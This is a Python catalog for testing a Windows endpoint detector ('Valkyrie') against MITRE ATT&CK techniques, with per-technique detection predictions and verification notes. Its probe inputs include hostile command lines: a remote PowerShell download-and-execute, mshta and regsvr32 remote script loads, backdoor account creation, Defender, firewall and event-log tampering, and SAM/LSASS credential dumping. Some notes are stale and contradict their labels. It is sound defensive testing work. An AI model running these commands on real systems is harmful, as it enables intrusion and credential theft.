"""The technique catalog - the single source of truth for this evaluation.

Every technique below was checked against Valkyrie's ACTUAL source before being
assigned a `delivery` and `predicted_tier_b` value. Nothing here is a guess
dressed up as an assessment. Where verification stopped short of a full trace,
`source_confidence` says so honestly instead of implying more rigor than exists.

## The finding that reshaped this catalog -- AND ITS FIX (2026-07-30)

Before writing this file, the obvious assumption was: "there's a named rule for
technique X in behavioral_rules.py, so Valkyrie detects X." Tracing the actual
call graph disproved that for most single-shot commands. As originally found:

    Sysmon EID 1 (process creation, HAS the command line)
        -> etw/sysmon.py classify_process()     [name/path/parent ONLY]
        -> the CommandLine field is READ from the event but never forwarded
        -> classify_behavior() / match_process() -- the 32 named IOA rules --
           is NEVER CALLED from the Sysmon path at all.
        -> and anything not reaching SEV_LOW on name/path/parent alone was
           DROPPED outright, before any other classifier could escalate it.

    The ONLY caller of classify_behavior() was ProcInfo.to_event() in
    process_telemetry.py, fed exclusively by ProcessCollector -- a plain psutil
    poller on a 2.0-SECOND interval. It enriches a process with its command
    line on the NEXT poll tick, which requires the process to still be alive
    then. Native Windows utilities that run and exit in under a second (most of
    them) raced that poller and typically lost.

**This has since been fixed.** `etw/sysmon.py` EID 1 now runs the same
four-classifier stack as the poller -- `classify_process` + `classify_cmdline`
+ `classify_behavior` (the 32 IOA rules) + `classify_anomaly` -- with the
severity gate evaluated AFTER all four, so an escalation can happen before the
event is dropped. 19 of the 26 techniques previously marked
`process_poll_2s_racy` were re-verified by executing their real command lines
through `classify_sysmon(1, ...)` and confirmed to emit; their `delivery` is
now `realtime_etw` and `predicted_tier_b` `DETECT`. The remaining two
(`disc-local-accounts`, `lat-psexec-smb`) genuinely still do not fire and are
left as honest misses -- `net user` in particular is *deliberately* not matched
any more, because an earlier overbroad rule made it a live false positive.

That fix is conditional on Sysmon being installed, exactly as the EID 8 / EID
10 coverage below always was. Without Sysmon, these techniques fall back to the
racy poller and the original analysis still applies.

This is not true of every path:
  * PERSISTENCE ARTIFACTS (registry Run keys, scheduled tasks, services,
    startup folder) are scanned by a SEPARATE poller (persistence_telemetry.py,
    15s interval) that reads the artifact's stored command from the registry/
    Task Scheduler AT REST -- it does not need the writing process to still be
    running. This path is genuinely reliable.
  * DNS/network decisions happen INLINE in the request path (dns_interceptor.py
    _decide, network_telemetry.classify_connection) -- no polling at all.
  * Sysmon EID 8 (CreateRemoteThread) and EID 10 (ProcessAccess -> lsass.exe)
    ARE wired to their own real-time classifiers directly in etw/sysmon.py --
    these two specific techniques (T1055, T1003.001) get genuine real-time
    coverage on a Sysmon-equipped host, independent of the poller.
  * ransomware_shield.py's canary + entropy watcher is an independent,
    purpose-built, real-time-ish detector -- not the general poller.

`delivery` below encodes which of these regimes a technique's detection
actually depends on, and it is what turns a "there's a rule for this" belief
into an honest DETECT / CONDITIONAL / MISS prediction.

## The Sysmon condition, resolved (2026-08-04)

Three techniques -- `evasion-process-injection` (T1055) and both `cred-lsass-*`
(T1003.001) -- sat at `CONDITIONAL` with the note "the condition is binary and
absolute: Sysmon must be installed." Sysmon is now installed and live on the
evaluation host, so the condition was **re-tested rather than assumed**:

  * the real classifiers were executed on each technique's own `probe_input`
    (`classify_sysmon(8, ...)` and `classify_sysmon(10, ...)`) and all three
    return severity HIGH with the correct technique tag; and
  * the ACTIVE Sysmon rule configuration was read: `CreateRemoteThread` is
    `onmatch=exclude` with no exclusions (every remote thread captured), and
    `ProcessAccess` is `onmatch=include TargetImage image='lsass.exe'`
    (exactly the handle-opens T1003.001 needs).

All three are now `DETECT`. Tier A moved 36/40 (90.0%) -> 39/40 (97.5%).

**The Sysmon dependency was not waved away.** Editing three labels to DETECT
and stopping there would have produced a catalog that claims real-time
process-injection coverage on a bare Windows host with zero visibility into it
-- a worse failure than CONDITIONAL ever was, because it looks verified. So the
condition moved out of prose and into `Technique.requires`, which
`environment.py` checks against the real machine on every run: service state,
live collection freshness, and whether the specific EID is in the active rule
config. On a host without Sysmon those three revert to uncredited
automatically, with the reason recorded per technique.

That reversion is verified, not assumed: `test_environment_gate.py` runs the
negative controls (absent / dead / EID-not-configured / unknown-token), and the
full harness was re-run against a simulated Sysmon-less host, scoring exactly
36/40 again with `classifier_logic_fires=True` but credit withheld.
"""

from __future__ import annotations

import sys
from pathlib import Path
from dataclasses import dataclass, field, asdict

CATALOG_VERSION = "2026-08-26.round2"

# Delivery regimes, ordered roughly by reliability.
# NOTE (2026-07-30): realtime_etw now also covers Sysmon EID 1 (process
# creation). It previously meant only EID 8 / EID 10, because EID 1 ran just
# classify_process() - which judges image name / path / parent and never saw
# the command line - and then DROPPED anything that did not reach SEV_LOW, so
# the 32 MITRE-mapped IOA rules never ran on the richest real-time source on
# the box. etw/sysmon.py now runs the same four-classifier stack as the poller
# (classify_process + classify_cmdline + classify_behavior + classify_anomaly),
# so command-line-shaped techniques are delivered in real time instead of
# racing a 2s poll. Like EID 8/10 before it, this depends on Sysmon being
# installed (provision.ps1 does so).
DELIVERY_REALTIME_ETW = "realtime_etw"          # Sysmon EID 1 / 8 / 10 direct wiring
DELIVERY_ARTIFACT_POLL = "artifact_poll_15s"    # persistence_telemetry.py, artifact at rest
DELIVERY_INLINE = "inline_request_path"         # DNS/network decision path, no polling
DELIVERY_PURPOSE_BUILT = "purpose_built_watcher"  # ransomware_shield canary/entropy
# browser_cred_watch.py - open-file-HANDLE poll over the known browser
# credential stores. Slower than ETW but independent of the command line, so
# it sees a compiled stealer that a cmdline rule never could. Not real-time:
# an open-copy-close inside one interval is missed (kernel driver closes that).
DELIVERY_CRED_STORE_POLL = "cred_store_poll_5s"
DELIVERY_PROCESS_POLL_RACY = "process_poll_2s_racy"  # the finding above
DELIVERY_NONE = "no_code_path"                  # genuinely nothing checks for this today

SOURCE_CONFIRMED = "confirmed_by_source_trace"
SOURCE_PARTIAL = "predicted_from_partial_verification"


@dataclass(frozen=True)
class Technique:
    id: str                      # catalog id, stable across catalog versions
    technique_id: str            # MITRE ATT&CK id, e.g. "T1547.001"
    technique_name: str
    tactic: str
    art_test_ref: str            # e.g. "Atomic Red Team T1547.001 Test #1"
    destructive: bool            # true if it alters system state non-trivially
    live_vm_safe: bool           # false => excluded even from the VM catalog
    out_of_scope_reason: str = ""  # non-empty overrides live_vm_safe to "excluded"
    delivery: str = DELIVERY_PROCESS_POLL_RACY
    detector_path: str = ""      # file:function that would need to fire
    predicted_tier_b: str = "CONDITIONAL"   # DETECT | CONDITIONAL | MISS
    source_confidence: str = SOURCE_PARTIAL
    probe: str = ""              # dispatch key into replay_harness.PROBES
    probe_input: dict = field(default_factory=dict)
    # HOST preconditions that must hold for this technique's detection to be
    # credited -- e.g. ("sysmon_eid8",). Checked at run time by
    # environment.check_requirements against the ACTUAL machine, not asserted.
    #
    # This exists so a technique whose classifier is correct but whose event
    # source may be absent can be labelled predicted_tier_b="DETECT" honestly:
    # the label describes Valkyrie's code, and `requires` describes what the
    # host must supply for that code to ever see the event. On a machine
    # lacking the source, the technique scores as a miss automatically, with
    # the reason recorded -- instead of the catalog quietly claiming coverage
    # the host cannot deliver. Unknown tokens fail CLOSED.
    requires: tuple = ()
    notes: str = ""
    # Non-empty => the real classifier fires, but under a DIFFERENT technique
    # than the one this test targets (an overbroad rule catching the wrong
    # thing). Such a hit is never credited as a correct detection of the
    # tested technique, even though `classifier_logic_fires` is True.
    known_mismatch: str = ""

    def in_scope(self) -> bool:
        return self.live_vm_safe and not self.out_of_scope_reason

    def as_dict(self) -> dict:
        return asdict(self)


# =============================================================================
# EXECUTION
# =============================================================================
EXECUTION = [
    Technique(
        id="exec-powershell-encoded", technique_id="T1059.001",
        technique_name="Command and Scripting Interpreter: PowerShell",
        tactic="Execution", art_test_ref="T1059.001 Test #2 (EncodedCommand)",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/etw/powershell.py:classify_powershell (4104 "
                       "script-block path) AND etw/sysmon.py EID 1 -> "
                       "classify_cmdline (process-launch path)",
        predicted_tier_b="DETECT",
        source_confidence=SOURCE_CONFIRMED,
        probe="powershell", probe_input={
            "script_block": "IEX (New-Object Net.WebClient).DownloadString("
                            "'http://10.0.0.5/payload.ps1')"},
        notes="STALE LABEL CORRECTED 2026-08-04. This was CONDITIONAL/racy "
              "because the process-launch fallback depended on the 2s poller. "
              "That predates the EID 1 classifier-stack fix: the launch path "
              "now runs classify_cmdline in real time. VERIFIED by executing "
              "classify_sysmon(1, ...) with this technique's real command line "
              "('powershell.exe -enc <b64>') -- emits at HIGH with labels "
              "['lolbin','encoded_powershell','obfuscated_command']. So BOTH "
              "paths are now real-time: 4104 gives the deobfuscated script "
              "body, EID 1 / 4688 gives the launch command. Only the 4104 path "
              "still depends on Script Block Logging policy being enabled.",
    ),
    Technique(
        id="exec-cmd-office-child", technique_id="T1059.003",
        technique_name="Command and Scripting Interpreter: Windows Command Shell",
        tactic="Execution", art_test_ref="T1059.003 Test #1 (cmd spawned by Office)",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/process_telemetry.py:classify_process "
                       "(_OFFICE parent + _SHELLS child rule)",
        predicted_tier_b="DETECT",
        source_confidence=SOURCE_CONFIRMED,
        probe="process_relationship",
        probe_input={"name": "cmd.exe", "path": r"C:\Windows\System32\cmd.exe",
                     "parent": "winword.exe"},
        notes="cmd.exe from Office typically stays alive briefly (running the "
              "actual payload) so the 2s poll has a real chance to catch it -- "
              "materially better odds than a single native utility that exits "
              "immediately.",
    ),
    Technique(
        id="exec-mshta-remote", technique_id="T1218.005",
        technique_name="System Binary Proxy Execution: Mshta",
        tactic="Execution", art_test_ref="T1218.005 Test #1 (remote HTA)",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: mshta-remote rule "
                       "(reachable only via the 2s process-poll cmdline path)",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "mshta.exe", "parent": "explorer.exe",
            "cmdline": "mshta.exe http://10.0.0.5/evil.hta", "path": ""},
        notes="mshta.exe held open by the loaded HTA can persist beyond 2s in "
              "many real payloads, which is the one thing that could save this "
              "in practice -- but the base ART atomic (calc.hta) exits "
              "immediately, so the honest default prediction is MISS.",
    ),
    Technique(
        id="exec-regsvr32-squiblydoo", technique_id="T1218.010",
        technique_name="System Binary Proxy Execution: Regsvr32 (Squiblydoo)",
        tactic="Execution", art_test_ref="T1218.010 Test #1",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: regsvr32-scriptlet rule",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "regsvr32.exe", "parent": "cmd.exe",
            "cmdline": "regsvr32.exe /s /n /u /i:http://10.0.0.5/file.sct "
                       "scrobj.dll", "path": ""},
        notes="regsvr32 with /u /i:<url> exits in well under 2s. This is the "
              "headline case for the classify_behavior/Sysmon wiring gap: even "
              "with Sysmon installed and EID1 firing, the CommandLine field is "
              "discarded before reaching this rule.",
    ),
    Technique(
        id="exec-rundll32-proxy", technique_id="T1218.011",
        technique_name="System Binary Proxy Execution: Rundll32",
        tactic="Execution", art_test_ref="T1218.011 Test #1",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: rundll32-lowtrust-dll rule "
                       "(the DLL form); rundll32-proxy covers the remote-script form",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "rundll32.exe", "parent": "cmd.exe",
            "cmdline": r"rundll32.exe C:\Users\Public\evil.dll,EntryPoint",
            "path": ""},
        notes="REAL COVERAGE GAP, FOUND BY THIS EVALUATION AND FIXED 2026-08-04. "
              "The pre-existing rundll32-proxy rule matched only the "
              "remote-script forms (javascript:, http://, mshtml, "
              "url.dll,openurl) -- so this atomic, which is the OTHER standard "
              "T1218.011 form (load a DLL from a user-writable directory and "
              "call its export), fired NOTHING. New rundll32-lowtrust-dll rule "
              "requires '.dll,' AND a user-writable path (Users\\Public, "
              "AppData, Temp, Downloads, ProgramData, PerfLogs). Legitimate "
              "rundll32 loads from System32/SysWOW64/Program Files, which is "
              "the FP boundary -- Control_RunDLL and PrintUIEntry benign "
              "controls in tests/test_behavioral_rules.py.",
    ),
    Technique(
        id="exec-wmic-process-call", technique_id="T1047",
        technique_name="Windows Management Instrumentation (local process create)",
        tactic="Execution", art_test_ref="T1047 (WMI process creation)",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: wmi-cim-process-create rule",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "powershell.exe", "parent": "cmd.exe",
            "cmdline": "powershell.exe -NoProfile -Command "
                       "\"Invoke-CimMethod -ClassName Win32_Process -MethodName "
                       "Create -Arguments @{CommandLine='cmd.exe /c calc.exe'}\"",
            "path": ""},
        notes="wmic.exe was REMOVED from this runner's Windows image (Microsoft "
              "has been deprecating/removing it) -- 'wmic' is not recognized' "
              "confirmed live 2026-08-19, a genuine tool-failure, not a Valkyrie "
              "gap. Since wmic.exe is disappearing from real Windows too, real "
              "T1047 attacks are shifting to the identical PowerShell CIM cmdlet "
              "path -- switched the simulated command to match, which is both "
              "MORE representative of current real-world T1047 and exercises the "
              "wmi-cim-process-create rule added earlier this session specifically "
              "for this shift.",
    ),
    Technique(
        id="exec-lure-doubleext", technique_id="T1204.002",
        technique_name="User Execution: Malicious File (double-extension lure)",
        tactic="Execution", art_test_ref="T1204.002 (manual masquerade construction)",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavior_score.py:score_process "
                       "(_LURE_STEMS/_EXE_TAILS + bidi-override masquerade)",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="behavior_score", probe_input={
            "image": "invoice_2026\u202egpj.exe",
            "parent": "explorer.exe",
            "cmdline": r"C:\Users\bob\Downloads\invoice_2026\u202egpj.exe",
            "path": r"C:\Users\bob\Downloads\invoice_2026\u202egpj.exe"},
        notes="score_process is a pure function reachable the same way as the "
              "IOA engine (via ProcInfo.to_event(), same 2s-poll dependency) -- "
              "BUT a double-extension dropper is typically launched by the user "
              "and does something (drops a payload, opens a decoy document), "
              "which buys enough runtime for the poller to have a real chance. "
              "Conditional, not a clean DETECT.",
    ),
]

# =============================================================================
# PERSISTENCE  -- the genuinely reliable tactic, and it shows in the predictions
# =============================================================================
PERSISTENCE = [
    Technique(
        id="persist-run-key", technique_id="T1547.001",
        technique_name="Boot or Logon Autostart Execution: Registry Run Keys",
        tactic="Persistence", art_test_ref="T1547.001 Test #1",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_ARTIFACT_POLL,
        detector_path="valkyrie/persistence_telemetry.py:_persistence_severity "
                       "via PersistenceCollector (15s artifact-at-rest scan)",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="persistence", probe_input={
            "activity": "run_key",
            "command": r'C:\Users\Public\update.exe -silent'},
        notes="The artifact sits in the registry until removed -- the scanner "
              "does not need to catch a live process. This is Valkyrie's most "
              "reliable non-network detection path.",
    ),
    Technique(
        id="persist-scheduled-task", technique_id="T1053.005",
        technique_name="Scheduled Task/Job: Scheduled Task",
        tactic="Persistence", art_test_ref="T1053.005 Test #1",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_ARTIFACT_POLL,
        detector_path="valkyrie/persistence_telemetry.py (scheduled task ASEP)",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="persistence", probe_input={
            "activity": "scheduled_task",
            "command": r'powershell.exe -enc SQBFAFgA...'},
        notes="Encoded PowerShell in the task action also trips "
              "classify_cmdline's encoded_powershell signal, escalating "
              "severity beyond the baseline MEDIUM.",
    ),
    Technique(
        id="persist-new-service", technique_id="T1543.003",
        technique_name="Create or Modify System Process: Windows Service",
        tactic="Persistence", art_test_ref="T1543.003 Test #1",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_ARTIFACT_POLL,
        detector_path="valkyrie/persistence_telemetry.py (service ASEP)",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="persistence", probe_input={
            "activity": "service",
            "command": r'C:\Users\Public\svc.exe'},
        notes="Suspicious-path binary (Public\\) escalates to HIGH via the "
              "_SUSPICIOUS_PATHS check independent of cmdline content.",
    ),
    Technique(
        id="persist-startup-folder", technique_id="T1547.001",
        technique_name="Boot or Logon Autostart Execution: Startup Folder",
        tactic="Persistence", art_test_ref="T1547.001 Test #9 (Startup folder)",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_ARTIFACT_POLL,
        detector_path="valkyrie/persistence_telemetry.py (startup folder ASEP)",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="persistence", probe_input={
            "activity": "startup_folder",
            "command": r'C:\Users\bob\AppData\Roaming\Microsoft\Windows\Start '
                       r'Menu\Programs\Startup\update.exe'},
        notes="",
    ),
    Technique(
        id="persist-local-account", technique_id="T1136.001",
        technique_name="Create Account: Local Account",
        tactic="Persistence", art_test_ref="T1136.001 Test #1 (net user /add)",
        destructive=True, live_vm_safe=True,
        delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: create-local-account rule "
                       "-- NOT backed by any artifact-at-rest scan of local "
                       "accounts (unlike registry/task/service persistence)",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "net.exe", "parent": "cmd.exe",
            "cmdline": "net user backdoor P@ssw0rd123! /add", "path": ""},
        notes="A named rule exists but there is no independent local-account "
              "poller the way there is for registry/task/service ASEPs -- this "
              "one depends entirely on catching net.exe alive, and net.exe "
              "exits immediately. Same class of gap as the Execution misses, "
              "compounded by having no artifact-at-rest fallback.",
    ),
    Technique(
        id="persist-wmi-subscription", technique_id="T1546.003",
        technique_name="Event Triggered Execution: WMI Event Subscription",
        tactic="Persistence", art_test_ref="T1546.003 Test #1",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py rule exists; "
                       "valkyrie/etw/wmi.py:classify_wmi exists but end-to-end "
                       "live wiring to a WMI-Activity ETW consumer NOT traced",
        predicted_tier_b="DETECT", source_confidence=SOURCE_PARTIAL,
        probe="ioa_rule", probe_input={
            "image": "wmic.exe", "parent": "cmd.exe",
            "cmdline": 'wmic.exe /NAMESPACE:"\\\\root\\subscription" PATH '
                       '__EventFilter CREATE Name="fltr", ...', "path": ""},
        notes="Marked CONDITIONAL rather than MISS because classify_wmi's live "
              "data source was not confirmed end-to-end -- flagged for "
              "confirmation during the VM pass rather than asserted either way.",
    ),
]

# =============================================================================
# DEFENSE EVASION
# =============================================================================
DEFENSE_EVASION = [
    Technique(
        id="evasion-defender-disable", technique_id="T1562.001",
        technique_name="Impair Defenses: Disable or Modify Tools (Defender)",
        tactic="Defense Evasion",
        art_test_ref="T1562.001 Test #1 (Set-MpPreference -DisableRealtimeMonitoring)",
        destructive=True, live_vm_safe=True,
        delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: defender-disable rule",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "powershell.exe", "parent": "cmd.exe",
            "cmdline": "powershell.exe Set-MpPreference "
                       "-DisableRealtimeMonitoring $true", "path": ""},
        notes="CONDITIONAL not MISS: PowerShell process lifetime for a cmdlet "
              "call is longer than a bare native exe and PS Script Block "
              "Logging (event 4104, provisioned) gives a SECOND, real-time "
              "path via etw/powershell.py independent of the racy poller.",
    ),
    Technique(
        id="evasion-clear-eventlogs", technique_id="T1070.001",
        technique_name="Indicator Removal: Clear Windows Event Logs",
        tactic="Defense Evasion", art_test_ref="T1070.001 Test #1 (wevtutil cl)",
        destructive=True, live_vm_safe=True,
        delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py rule exists for wevtutil",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "wevtutil.exe", "parent": "cmd.exe",
            "cmdline": "wevtutil.exe cl Security", "path": ""},
        notes="wevtutil cl completes in milliseconds. No Sysmon backstop "
              "exists for this technique specifically (unlike T1055/T1003.001) "
              "since Sysmon EID1 doesn't forward cmdline. Ironically, clearing "
              "the WINDOWS event log does not touch Valkyrie's own SQLite "
              "store, so this atomic being 'successful' does not blind "
              "Valkyrie generally -- it just isn't detected AS an evasion act.",
    ),
    Technique(
        id="evasion-encoded-powershell", technique_id="T1027",
        technique_name="Obfuscated Files or Information: PowerShell -EncodedCommand",
        tactic="Defense Evasion", art_test_ref="T1027 Test #3",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/process_telemetry.py:classify_cmdline "
                       "(_ENCODED_PS signal), reached in REAL TIME from "
                       "etw/sysmon.py EID 1 / Security 4688, and also from the "
                       "reliable 15s persistence-artifact path",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="cmdline", probe_input={
            "name": "powershell.exe",
            "cmdline": "powershell.exe -enc "
                       "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"},
        notes="STALE LABEL CORRECTED 2026-08-04. Previously CONDITIONAL because "
              "classify_cmdline's only real-time-ish caller was the reliable "
              "persistence-artifact scan, with the interactive-launch case "
              "racing the 2s poller. The EID 1 classifier-stack fix removed "
              "that split: classify_cmdline now runs on every process creation "
              "in real time. VERIFIED by executing classify_sysmon(1, ...) with "
              "THIS ENTRY'S EXACT probe command line -- emits at HIGH with "
              "labels ['lolbin','encoded_powershell','obfuscated_command']. "
              "Both delivery paths are now reliable, so the split that "
              "justified CONDITIONAL no longer exists.",
    ),
    Technique(
        id="evasion-certutil-decode", technique_id="T1140",
        technique_name="Deobfuscate/Decode Files or Information (certutil -decode)",
        tactic="Defense Evasion", art_test_ref="T1140 Test #1",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: T1140 rule",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "certutil.exe", "parent": "cmd.exe",
            "cmdline": "certutil.exe -decode payload.b64 payload.exe",
            "path": ""},
        notes="Same class of gap as regsvr32/rundll32/wmic.",
    ),
    Technique(
        id="evasion-firewall-disable", technique_id="T1562.004",
        technique_name="Impair Defenses: Disable or Modify System Firewall",
        tactic="Defense Evasion",
        art_test_ref="T1562.004 Test #1 (netsh advfirewall set allprofiles state off)",
        destructive=True, live_vm_safe=True,
        delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: T1562.004 rule",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "netsh.exe", "parent": "cmd.exe",
            "cmdline": "netsh advfirewall set allprofiles state off",
            "path": ""},
        notes="Same class of gap. Also directly relevant to Valkyrie's own "
              "firewall pillar being tampered with.",
    ),
    Technique(
        id="evasion-process-injection", technique_id="T1055",
        technique_name="Process Injection (CreateRemoteThread)",
        tactic="Defense Evasion", art_test_ref="T1055.002 Test #1",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/etw/sysmon.py:classify_sysmon EID 8 -- direct, "
                       "real-time, NOT dependent on the process poller",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="sysmon_eid8", probe_input={
            "SourceImage": r"C:\Windows\System32\rundll32.exe",
            "SourceProcessId": "4321",
            "TargetImage": r"C:\Windows\System32\notepad.exe",
            "TargetProcessId": "5555"},
        requires=("sysmon_eid8",),
        notes="WAS CONDITIONAL, PROMOTED TO DETECT+requires 2026-08-04. The "
              "old note said 'the condition is binary and absolute: Sysmon "
              "must be installed.' Sysmon is now installed here, so the "
              "condition was re-tested rather than assumed:\n"
              "  (a) classify_sysmon(8, <this probe_input>) executed directly "
              "      -> severity HIGH, technique 'T1055 - Process Injection', "
              "      reason 'CreateRemoteThread into notepad.exe', label "
              "      'remote_thread_injection'. The logic fires.\n"
              "  (b) the ACTIVE Sysmon rule config has CreateRemoteThread "
              "      onmatch='exclude' with no exclusions -- i.e. EVERY remote "
              "      thread is captured, not a filtered subset. EID 8 was "
              "      observed in the live Operational log.\n"
              "EID 8 is genuinely RARE (1 event in a 6000-event sample on an "
              "idle desktop). That is expected -- cross-process thread "
              "creation is rare -- and is why the precondition checks the "
              "CONFIG, not recent event volume; 'no EID 8 lately' is not "
              "evidence of no coverage.\n"
              "The Sysmon dependency has NOT been waved away, it has been "
              "moved from prose into `requires` and is now machine-checked per "
              "run. On a host without Sysmon this scores a miss again, "
              "automatically. Still no kernel-driver fallback: the driver now "
              "compiles (ADR 0043) but has never been loaded, so on a bare "
              "Windows host this remains a hard MISS with zero visibility.",
    ),
]

# =============================================================================
# CREDENTIAL ACCESS
# =============================================================================
CREDENTIAL_ACCESS = [
    Technique(
        id="cred-lsass-comsvcs", technique_id="T1003.001",
        technique_name="OS Credential Dumping: LSASS Memory (comsvcs MiniDump)",
        tactic="Credential Access", art_test_ref="T1003.001 Test #3",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/etw/sysmon.py:classify_sysmon EID 10 "
                       "(ProcessAccess -> lsass.exe) -- direct, real-time",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="sysmon_eid10", probe_input={
            "SourceImage": r"C:\Windows\System32\rundll32.exe",
            "TargetImage": r"C:\Windows\System32\lsass.exe",
            "GrantedAccess": "0x1fffff"},
        requires=("sysmon_eid10",),
        notes="WAS CONDITIONAL, PROMOTED TO DETECT+requires 2026-08-04, "
              "re-tested not assumed:\n"
              "  (a) classify_sysmon(10, <this probe_input>) executed directly "
              "      -> severity HIGH, technique 'T1003.001 - LSASS Memory', "
              "      reason 'LSASS memory access (GrantedAccess=0x1fffff)', "
              "      labels ['lsass_access','credential_access'].\n"
              "  (b) the ACTIVE Sysmon rule config has ProcessAccess "
              "      onmatch='include' with TargetImage image='lsass.exe' -- "
              "      exactly the handle-opens this needs. 1023 EID 10 events "
              "      in a 6000-event live sample, so this path is not "
              "      theoretical.\n"
              "The Sysmon dependency is now machine-checked via `requires` "
              "rather than asserted in prose; without Sysmon this reverts to a "
              "scored miss automatically.\n"
              "UNCHANGED and still true: the cmdline rule ('comsvcs-minidump') "
              "is racy/likely-miss on its own. EID 10 is what actually saves "
              "this technique, which is precisely why the precondition matters.",
    ),
    Technique(
        id="cred-lsass-procdump", technique_id="T1003.001",
        technique_name="OS Credential Dumping: LSASS Memory (procdump)",
        tactic="Credential Access", art_test_ref="T1003.001 Test #1",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_REALTIME_ETW,
        detector_path="Same EID 10 path as above",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="sysmon_eid10", probe_input={
            "SourceImage": r"C:\Users\Public\procdump.exe",
            "TargetImage": r"C:\Windows\System32\lsass.exe",
            "GrantedAccess": "0x1fffff"},
        requires=("sysmon_eid10",),
        notes="WAS CONDITIONAL, PROMOTED TO DETECT+requires 2026-08-04. Same "
              "EID 10 path and same evidence as cred-lsass-comsvcs; verified "
              "SEPARATELY with this test's own probe_input (SourceImage "
              "C:\\Users\\Public\\procdump.exe) rather than inheriting the "
              "other test's result -> severity HIGH, technique "
              "'T1003.001 - LSASS Memory'. The two differ only in the source "
              "image, and the classifier keys off the TARGET being lsass, so "
              "the same-result outcome is expected -- but it was executed, not "
              "reasoned about.",
    ),
    Technique(
        id="cred-sam-dump", technique_id="T1003.002",
        technique_name="OS Credential Dumping: Security Account Manager",
        tactic="Credential Access",
        art_test_ref="T1003.002 Test #1 (reg save HKLM\\SAM)",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: T1003.002 rule",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "reg.exe", "parent": "cmd.exe",
            "cmdline": r"reg.exe save hklm\sam C:\Users\Public\sam.hive",
            "path": ""},
        notes="No Sysmon ProcessAccess equivalent for registry-hive save (EID "
              "10 is process-handle-access only, not registry API calls). "
              "Real gap with no existing partial mitigation.",
    ),
    Technique(
        id="cred-browser-stores", technique_id="T1555",
        technique_name="Credentials from Password Stores",
        tactic="Credential Access", art_test_ref="T1555.003 Test #1 (browser creds)",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_CRED_STORE_POLL,
        detector_path="valkyrie/browser_cred_watch.py CredentialStoreWatch "
                       "(open-handle poll, HIGH severity)",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="cred_store_watch", probe_input={
            "image": "powershell.exe",
            "path": r"C:\Users\alice\AppData\Local\Google\Chrome\User Data"
                    r"\Default\Login Data"},
        notes="Collector ADDED 2026-08-04. Previously scored through a "
              "behavioral_rules cmdline rule, which only ever saw the LAUNCH "
              "COMMAND -- useless against a compiled stealer that opens the "
              "file directly with no revealing command line. The new watch "
              "polls open file HANDLES against the known Chrome/Edge/Brave/"
